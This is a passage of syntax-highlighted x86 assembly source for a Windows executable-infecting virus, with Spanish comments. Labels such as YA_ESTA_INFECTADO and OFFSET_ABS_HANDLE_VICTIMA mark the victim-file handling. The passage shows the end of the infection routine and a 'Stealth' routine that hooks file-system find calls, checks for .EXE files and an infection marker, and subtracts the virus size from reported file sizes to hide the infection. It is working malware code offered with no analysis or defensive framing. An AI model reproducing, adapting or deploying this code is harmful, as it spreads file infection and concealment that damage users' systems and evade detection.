        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_HANDLE_VICTIMA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CLOSE_FILE</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SALTO_A_OLD_IFS_INTERNO</span><span class="sc0">

</span><span class="sc5">NO_ES_PE_EXE_YCIERRO</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">YA_ESTA_INFECTADO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_HANDLE_VICTIMA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CLOSE_FILE</span><span class="sc0">


</span><span class="sc5">malopen</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">NO_ES_PE_EXE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SALTO_A_OLD_IFS_INTERNO</span><span class="sc0"> 
        </span><span class="sc5">SALTO_A_OLD_IFS_INTERNO</span><span class="sc4">:</span><span class="sc0"> 
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc5">SALTO_A_OLD_IFS</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc0">
        </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">0000</span><span class="sc0">  


</span><span class="sc1">;;;;;;;;;;;;;;* It is a optional Plus *;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">Stealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">StSIGGFILEHOOK</span><span class="sc0">
</span><span class="sc5">StSIGGFILEHOOK</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ESP</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc10">DWord</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_Sthealth</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 



        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FindAndFindNext</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc2">26h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FindF</span><span class="sc0">


</span><span class="sc5">NumberPre</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FindF</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">44</span><span class="sc0">   </span><span class="sc1">;;poiter to path</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
       
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_file_EXE</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">StFFbuclecpy</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StFFlistocpy</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">StFFbuclecpy</span><span class="sc0">
</span><span class="sc5">StFFlistocpy</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;;agrego caracter nulo</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoesFile</span><span class="sc0">
      
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'e'</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">pasolae</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoesFile</span><span class="sc0">
</span><span class="sc5">pasolae</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'x'</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">pasolax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'X'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoesFile</span><span class="sc0">
</span><span class="sc5">pasolax</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">esFile</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'e'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoesFile</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">esFile</span><span class="sc0">
</span><span class="sc5">NoesFile</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">listobarra</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc13">'\'
</span><span class="sc0">       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">listobarra</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_NumberPre</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">        </span><span class="sc1">;; ecx = nombre ptr</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">        </span><span class="sc1">;; ebx = size ptr</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Ready</span><span class="sc0">

</span><span class="sc5">esFile</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">        </span><span class="sc1">;; ebx = size ptr</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_NumberPre</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_file_EXE</span><span class="sc0"> </span><span class="sc1">;; ecx = nombre ptr</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Open</span><span class="sc0">
 

       
</span><span class="sc5">FindAndFindNext</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">        </span><span class="sc1">;; ecx = nombre ptr</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">        </span><span class="sc1">;; ebx = size ptr</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">




</span><span class="sc5">ready</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;;aqui tiene que estar push size... push nombre unicode</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">256</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;asta el fin del nombre</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">SCASW</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">StNO_ES_PE_EXE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">;me voy al comienzo de la extencion</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0045h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StPASO</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0065h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StPASO</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">StNO_ES_PE_EXE</span><span class="sc0">
</span><span class="sc5">StPASO</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0058h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StPASO2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0078h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StPASO2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">StNO_ES_PE_EXE</span><span class="sc0">
</span><span class="sc5">StPASO2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0045h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StES_EXEexe</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc2">0065h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StES_EXEexe</span><span class="sc0">
        
</span><span class="sc5">StNO_ES_PE_EXE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">StES_EXEexe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">;; ecx = nombre ptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">;;paso a unicode</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0"> 
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_file_EXE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_NumberPre</span><span class="sc4">]</span><span class="sc1">;;;;;;;;;;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Stbuclecpy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Stlistocpy</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Stbuclecpy</span><span class="sc0">
</span><span class="sc5">Stlistocpy</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;;agrego caracter nulo</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;;eax=Name ascii</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_NumberPre</span><span class="sc4">]</span><span class="sc1">;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">Open</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">OPEN_FILE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">  </span><span class="sc5">OpenGewd</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">  </span><span class="sc5">OPEN_FILE_IN_CONTEXT</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">  </span><span class="sc5">OpenGewd</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_NumberPre</span><span class="sc4">]</span><span class="sc1">;;;;;;;;;;</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">  </span><span class="sc5">OPEN_FILE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">  </span><span class="sc5">OpenGewd</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">  </span><span class="sc5">OPEN_FILE_IN_CONTEXT</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">  </span><span class="sc5">OpenGewd</span><span class="sc0">


        </span><span class="sc6">Jmp</span><span class="sc0">  </span><span class="sc5">FueraStErrorOpen</span><span class="sc0">


</span><span class="sc5">OpenGewd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;;guardo el handle en ebx por cuestiones practicas</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                                                                                                                                                                                                   
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">59</span><span class="sc0">          </span><span class="sc1">;;;CArGo La DireCCion Al NewHead en OFFSET_ABS_DUMMY</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">OFFSET_ABS_NiniH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">READ_FILE</span><span class="sc0">


        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;; en eax = size ptr</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OFFSET_ABS_NiniH</span><span class="sc4">]</span><span class="sc5">.MINIHead.IS_INFECTED</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0"> </span><span class="sc1">;;compruebo que no esta infectado</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">FueraStandClose</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc5">SIZE_VIRUS</span><span class="sc0">

</span><span class="sc5">FueraStandClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">CLOSE_FILE</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FueraStErrorOpen</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">FueraSt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;///////////////////////////////ENDP///////////////////////////////////</span><span class="sc0">
</span><span class="sc5">FIN_CODE</span><span class="sc4">:</span><span class="sc0">
